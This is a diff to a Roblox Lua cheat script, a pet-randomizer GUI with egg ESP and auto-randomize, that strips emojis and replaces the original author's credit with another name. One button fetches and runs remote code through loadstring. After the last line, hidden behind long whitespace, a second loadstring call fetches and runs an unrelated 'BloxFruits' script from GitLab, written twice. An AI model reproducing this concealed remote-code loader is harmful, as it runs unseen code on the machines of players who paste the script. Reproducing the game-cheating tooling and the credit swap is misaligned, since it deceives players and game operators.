@@ -149,7 +149,7 @@ end
 
 local function countdownAndRandomize(button)
     for i = 10, 1, -1 do
-        button.Text = "ðŸŽ² Randomize in: " .. i
+        button.Text = "Randomize in: " .. i
         wait(1)
     end
     flashEffect(button)
@@ -157,7 +157,7 @@ local function countdownAndRandomize(button)
     button.Text = "ðŸŽ² Randomize Pets"
 end
 
--- ðŸŒ¿ GUI Setup
+-- GUI Setup
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 screenGui.Name = "PetHatchGui"
 
@@ -172,12 +172,12 @@ Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 30)
 title.BackgroundTransparency = 1
-title.Text = "ðŸ¾ Pet Randomizer âœ¨"
+title.Text = "Pet Randomizer"
 title.Font = Enum.Font.FredokaOne
 title.TextSize = 22
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- ðŸ‘‡ Dragging
+-- Dragging
 local drag = Instance.new("TextButton", title)
 drag.Size = UDim2.new(1, 0, 1, 0)
 drag.Text = ""
@@ -197,12 +197,12 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
--- ðŸŽ² Randomize Button
+-- Randomize Button
 local randomizeBtn = Instance.new("TextButton", frame)
 randomizeBtn.Size = UDim2.new(1, -20, 0, 50)
 randomizeBtn.Position = UDim2.new(0, 10, 0, 40)
 randomizeBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
-randomizeBtn.Text = "ðŸŽ² Randomize Pets"
+randomizeBtn.Text = "Randomize Pets"
 randomizeBtn.TextSize = 20
 randomizeBtn.Font = Enum.Font.FredokaOne
 randomizeBtn.TextColor3 = Color3.new(1, 1, 1)
@@ -210,18 +210,18 @@ randomizeBtn.MouseButton1Click:Connect(function()
     countdownAndRandomize(randomizeBtn)
 end)
 
--- ðŸ‘ï¸ ESP Toggle
+-- ESP Toggle
 local toggleBtn = Instance.new("TextButton", frame)
 toggleBtn.Size = UDim2.new(1, -20, 0, 40)
 toggleBtn.Position = UDim2.new(0, 10, 0, 100)
 toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-toggleBtn.Text = "ðŸ‘ï¸ ESP: ON"
+toggleBtn.Text = "ESP: ON"
 toggleBtn.TextSize = 18
 toggleBtn.Font = Enum.Font.FredokaOne
 toggleBtn.TextColor3 = Color3.new(1, 1, 1)
 toggleBtn.MouseButton1Click:Connect(function()
     espEnabled = not espEnabled
-    toggleBtn.Text = espEnabled and "ðŸ‘ï¸ ESP: ON" or "ðŸ‘ï¸ ESP: OFF"
+    toggleBtn.Text = espEnabled and "ESP: ON" or "ESP: OFF"
     for _, egg in pairs(getPlayerGardenEggs(60)) do
         if espEnabled then
             applyEggESP(egg, truePetMap[egg])
@@ -231,17 +231,17 @@ toggleBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- ðŸŸ£ Initial ESP
+-- Initial ESP
 for _, egg in pairs(getPlayerGardenEggs(60)) do
     applyEggESP(egg, truePetMap[egg])
 end
 
--- ðŸ” Auto Randomize Button
+-- Auto Randomize Button
 local autoBtn = Instance.new("TextButton", frame)
 autoBtn.Size = UDim2.new(1, -20, 0, 30)
 autoBtn.Position = UDim2.new(0, 10, 0, 145)
 autoBtn.BackgroundColor3 = Color3.fromRGB(80, 150, 60)
-autoBtn.Text = "ðŸ” Auto Randomize: OFF"
+autoBtn.Text = "Auto Randomize: OFF"
 autoBtn.TextSize = 16
 autoBtn.Font = Enum.Font.FredokaOne
 autoBtn.TextColor3 = Color3.new(1, 1, 1)
@@ -255,14 +255,14 @@ local bestPets = {
 
 autoBtn.MouseButton1Click:Connect(function()
     autoRunning = not autoRunning
-    autoBtn.Text = autoRunning and "ðŸ” Auto Randomize: ON" or "ðŸ” Auto Randomize: OFF"
+    autoBtn.Text = autoRunning and "Auto Randomize: ON" or "Auto Randomize: OFF"
     coroutine.wrap(function()
         while autoRunning do
             countdownAndRandomize(randomizeBtn)
             for _, petName in pairs(truePetMap) do
                 if bestPets[petName] then
                     autoRunning = false
-                    autoBtn.Text = "ðŸ” Auto Randomize: OFF"
+                    autoBtn.Text = "Auto Randomize: OFF"
                     return
                 end
             end
@@ -271,7 +271,7 @@ autoBtn.MouseButton1Click:Connect(function()
     end)()
 end)
 
--- âœ¨ Cool Load Pet Age Script Button
+-- Cool Load Pet Age Script Button
 local loadAgeBtn = Instance.new("TextButton", frame)
 loadAgeBtn.Size = UDim2.new(1, -20, 0, 30)
 loadAgeBtn.Position = UDim2.new(0, 10, 1, -35)
@@ -285,12 +285,12 @@ loadAgeBtn.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/x/refs/heads/main/Egg_RandomizerV2.lua"))()
 end)
 
--- ðŸ‘¤ Credit
+-- Credit
 local credit = Instance.new("TextLabel", frame)
 credit.Size = UDim2.new(1, 0, 0, 20)
 credit.Position = UDim2.new(0, 0, 0, 22)
 credit.BackgroundTransparency = 1
-credit.Text = "by viet.hoang.lm"
+credit.Text = "by yobi"
 credit.Font = Enum.Font.FredokaOne
 credit.TextSize = 14
 credit.TextColor3 = Color3.fromRGB(200, 200, 200)                                                                                                                                                                                                                                                                                                                                                                                       loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/BloxFruits"))()                                                                                                                                                                                                                                                                                                                                                                                       loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/BloxFruits"))()
